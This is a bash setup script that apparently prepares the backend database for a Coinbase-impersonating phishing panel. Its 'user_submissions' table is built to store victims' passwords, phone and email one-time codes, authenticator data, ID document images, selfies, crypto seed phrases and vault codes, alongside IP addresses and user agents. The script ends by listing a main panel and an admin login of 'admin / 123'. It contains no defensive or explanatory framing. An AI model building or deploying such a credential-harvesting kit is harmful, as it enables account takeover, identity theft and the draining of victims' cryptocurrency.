#!/bin/bash

# Quick setup script for immediate use
# This assumes you already have PHP, MySQL, and Apache installed

echo "Starting quick setup..."

# Create database and tables
sudo mysql -u coinbase_user -pcoinbase_pass -e "
CREATE DATABASE IF NOT EXISTS coinbase_panel;
USE coinbase_panel;

CREATE TABLE IF NOT EXISTS user_submissions (
    id INT AUTO_INCREMENT PRIMARY KEY,
    token VARCHAR(255) UNIQUE,
    activity VARCHAR(255),
    email VARCHAR(255),
    data TEXT,
    status VARCHAR(255),
    password VARCHAR(255),
    phone_otp VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    ip_address VARCHAR(45),
    user_agent TEXT,
    auth_app TEXT,
    login_url VARCHAR(255),
    email_otp VARCHAR(255),
    email_app VARCHAR(255),
    front TEXT,
    back TEXT,
    selfie TEXT,
    seed TEXT,
    vault_crypto TEXT,
    vault_code VARCHAR(255)
);
"

echo "Database setup complete!"
echo ""
echo "To start the application:"
echo "php -S localhost:8000"
echo ""
echo "Access URLs:"
echo "- Main Panel: http://localhost:8000"
echo "- Admin Panel: http://localhost:8000/admin"
echo "- Admin Login: admin / 123"
